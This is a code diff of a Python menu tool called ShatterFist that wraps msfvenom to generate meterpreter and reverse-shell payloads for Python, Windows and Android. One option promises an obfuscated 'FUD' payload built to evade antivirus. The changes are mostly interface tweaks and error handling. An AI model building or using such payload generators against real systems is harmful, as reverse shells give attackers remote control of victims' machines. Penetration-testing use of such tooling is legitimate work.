@@ -58,17 +58,9 @@ def printopt(texxt):
 def printbannred(texxt):
     return print(colorama.Fore.LIGHTRED_EX +  "#=====+" + texxt + "+=====#" )
 
-    
-    
-
-def inputcopt(texxt):
-    print("\n")
-    dvhdnhhg = input(colorama.Fore.YELLOW + str(texxt) + colorama.Fore.WHITE).strip()
-    print(colorama.Style.RESET_ALL)  
-    return dvhdnhhg
 def inputc(texxt):
     print("\n")
-    inputcy = input(colorama.Fore.LIGHTBLUE_EX + str(texxt) + colorama.Fore.GREEN).strip()
+    inputcy = input(colorama.Fore.LIGHTYELLOW_EX + str(texxt) + colorama.Fore.GREEN).strip()
     print(colorama.Style.RESET_ALL)  
     return inputcy    
 
@@ -86,23 +78,29 @@ def payloadgen1(payload, talkback, lhost, lport, outfile):
     subprocess.run(["msfvenom", "-p", payload + "/meterpreter/reverse_" + talkback, "LHOST=" + lhost, "LPORT=" + str(lport), "-o", outfile])    
 
 def payloadgen2(payloadandsession, lhost, lport, outfile, args1, args2):
-    subprocess.run(f"msfvenom {args1} -p {payloadandsession} LHOST={lhost} LPORT={lport} {args2} -o {outfile}", shell=True)    
-
-
+    try:
+        subprocess.run(f"msfvenom {args1} -p {payloadandsession} LHOST={lhost} LPORT={lport} {args2} -o {outfile}", check=True,shell=True)   
+    except subprocess.CalledProcessError:
+        print(colorama.Fore.LIGHTRED_EX +  "An error has occured! Please read the above output and make sure you entered the options properly!" + colorama.Style.RESET_ALL)
+    else: 
+        print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone! \nSaved as {outfile}\n(If no errors were encountered that is)\n#====================#\n\n" + colorama.Style.RESET_ALL)
+    finally:
+         input(colorama.Fore.LIGHTBLUE_EX + "Press enter to continue" + colorama.Style.RESET_ALL)    
 def asktb():
     global n, talkbackm1 
     n = 1 
     printopt("Use reverse_tcp")
     printopt("Use reverse_https")
-    talkbackopt = inputcopt("Option: ").strip()
+    talkbackopt = inputc("Option: ").strip()
     if  talkbackopt == "1" or talkbackopt == "tcp":
         talkbackm1 = "tcp"
+        print (f"{colorama.Fore.GREEN}Using {colorama.Fore.LIGHTRED_EX}{talkbackm1} {colorama.Style.RESET_ALL}\n")
     elif talkbackopt == "2" or talkbackopt == "https":
         talkbackm1 = "https"
+        print (f"{colorama.Fore.GREEN}Using {colorama.Fore.LIGHTRED_EX}{talkbackm1} {colorama.Style.RESET_ALL}\n")
+
     else:
         print (f"{colorama.Fore.GREEN}Defaulting to {colorama.Fore.LIGHTRED_EX}{talkbackm1} {colorama.Style.RESET_ALL}\n")
-
-        
 
 
 def pythonpayload():
@@ -110,8 +108,11 @@ def pythonpayload():
     n = 1
     clearscreen()
     printbannred("Python Payload Menu")
+    time.sleep(0.2)
     printopt("Create a simple python meterpreter payload")
+    time.sleep(0.1)
     printopt("Create an obfistucated (FUD) python meterpreter payload")
+    time.sleep(0.1)
     inputpy = inputc("Option: ").strip()
     lask()
     inputpy2 = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({pyoutfile}){colorama.Fore.BLUE}: ")
@@ -123,8 +124,6 @@ def pythonpayload():
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
         #payloadgen1("python", talkbackm1, lhost, lport, pyoutfile)
         payloadgen2(f"python/meterpreter/reverse_{talkbackm1}", lhost, lport, pyoutfile, '', '')
-        print(colorama.Style.RESET_ALL)
-        print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone! \nSaved as {pyoutfile}\n(If no errors were encountered that is)\n#====================#\n\n" + colorama.Style.RESET_ALL)
         time.sleep(2)
         menu()
 
@@ -160,7 +159,6 @@ def pythonpayloadfud():
     file = open(pyoutfile, "w")
     file.write(outpy)
     file.close
-    print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone! \nSaved as {pyoutfile}\n(If no errors were encountered that is)\n#====================#\n\n" + colorama.Style.RESET_ALL)
     time.sleep(2)
     menu()
 
@@ -171,7 +169,7 @@ def winpayload():
     printbannred("Windows Payload Menu")
     printopt("Create a simple windows meterpreter payload")
     printopt("Create a siple windows shell payload")
-    inputwin = inputcopt("Option: ").strip()
+    inputwin = inputc("Option: ").strip()
     lask()
     inputy2 = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({winoutfile}){colorama.Fore.BLUE}: ")
     asktb()
@@ -180,15 +178,11 @@ def winpayload():
     if inputwin == "1": 
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
         payloadgen2("windows/meterpreter/reverse_tcp", lhost, lport, winoutfile,f'-a {defaultarch}','-b "\\x00" -f exe')
-        print(colorama.Style.RESET_ALL)
-        print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone! \nSaved as {winoutfile}\n(If no errors were encountered that is)\n#====================#\n\n" + colorama.Style.RESET_ALL)
         time.sleep(2)
         menu()
     if inputwin == "2":
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
         payloadgen2("windows/shell/reverse_tcp", lhost, lport, winoutfile,f'-a {defaultarch}','-b "\\x00" -f exe')
-        print(colorama.Style.RESET_ALL)
-        print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone! \nSaved as {winoutfile}\n(If no errors were encountered that is)\n#====================#\n\n" + colorama.Style.RESET_ALL)
         time.sleep(2)    
 
     else:
@@ -202,14 +196,12 @@ def androidpayload():
     clearscreen()
     printbannred("Android Payload Menu")
     printopt("Create a simple android payload")
-    inputy = inputcopt("Option: ").strip()
+    inputy = inputc("Option: ").strip()
     lask()
     asktb()
     if inputy == "1": 
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
         payloadgen2(f"android/meterpreter/reverse_{talkbackm1}", lhost, lport, androutfile, '', '')
-        print(colorama.Style.RESET_ALL)
-        print(colorama.Fore.LIGHTGREEN_EX + f"Done! \nSaved as {androutfile} \n\n" + colorama.Style.RESET_ALL)
         time.sleep(2)
         menu()
 
@@ -222,30 +214,32 @@ def androidpayload():
     
 
 def menu():
+    clearscreen()
     printopt("Python payload menu")
     printopt("Windows payload menu")
     printopt("Android payload menu")
     #Option for Metasploit Console
     print(colorama.Fore.BLUE + "[" +  colorama.Style.RESET_ALL + "M" + colorama.Fore.BLUE + "] " + colorama.Fore.LIGHTBLUE_EX + "Start the Metasploit Framework Console" + colorama.Style.RESET_ALL)
     print(colorama.Fore.BLUE + "[" +  colorama.Style.RESET_ALL + "E" + colorama.Fore.BLUE + "] " + colorama.Fore.LIGHTBLUE_EX + "Exit ShatterFist" + colorama.Style.RESET_ALL)
-    input1 = inputcopt("Option: ").strip().lower()
+    input1 = inputc("Option: ").strip().lower()
     if input1 == "1":
+        time.sleep(0.1)
         pythonpayload()
     elif input1 == "2":
         winpayload()
     elif input1 == "3":
         androidpayload() 
-    elif input1 == "m":
+    elif input1 == "m" or input1 == "msfconsole":
         clearscreen()
         print(colorama.Fore.LIGHTRED_EX)
         subprocess.run("msfconsole")   
-    elif input1  == "e":
+    elif input1  == "e" or input1 == "exit":
         clearscreen()
         print(colorama.Fore.LIGHTRED_EX)
         bye = "Thanks for using ShatterFist!"
         for letter in bye:
             print(letter,end="", flush=True)
-            time.sleep(0.1)
+            time.sleep(0.05)
         sys.exit()
 
     else:
@@ -255,9 +249,9 @@ def menu():
         
 def main():
     print (colorama.Fore.LIGHTRED_EX + banner +  colorama.Style.RESET_ALL)
+    time.sleep(0.1)
     menu()
 colorama.init()    
-clearscreen()
 main()
 
 
